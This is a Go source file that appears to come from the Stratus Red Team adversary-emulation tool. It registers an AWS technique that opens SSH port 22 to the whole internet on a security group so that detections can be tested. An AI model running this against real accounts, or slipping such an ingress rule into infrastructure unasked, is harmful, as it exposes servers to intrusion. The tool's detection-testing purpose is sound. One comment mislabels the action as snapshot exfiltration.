package aws

import (
	"context"
	_ "embed"
	"errors"
	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/ec2"
	"github.com/datadog/stratus-red-team/internal/providers"
	"github.com/datadog/stratus-red-team/pkg/stratus"
	"github.com/datadog/stratus-red-team/pkg/stratus/mitreattack"
	"log"
)

//go:embed main.tf
var tf []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:                 "aws.exfiltration.open-port-22-ingress-on-security-group",
		FriendlyName:       "Open Ingress Port 22 on a Security Group",
		Platform:           stratus.AWS,
		MitreAttackTactics: []mitreattack.Tactic{mitreattack.Exfiltration},
		Description: `
Opens ingress traffic on port 22 from the Internet.

Warm-up: Creates a security group.
Detonation: Calls AuthorizeSecurityGroupIngress
`,
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
	})
}

func detonate(params map[string]string) error {
	ec2Client := ec2.NewFromConfig(providers.AWS().GetConnection())

	// Find the snapshot to exfiltrate
	securityGroupId := params["security_group_id"]

	// Open port 22 to the world
	log.Println("Opening port 22 from the Internet on " + securityGroupId)

	_, err := ec2Client.AuthorizeSecurityGroupIngress(context.Background(), &ec2.AuthorizeSecurityGroupIngressInput{
		GroupId:    aws.String(securityGroupId),
		CidrIp:     aws.String("0.0.0.0/0"),
		FromPort:   aws.Int32(22),
		ToPort:     aws.Int32(22),
		IpProtocol: aws.String("tcp"),
	})

	if err != nil {
		return errors.New("unable to open port 22 on security group " + err.Error())
	}

	return nil
}
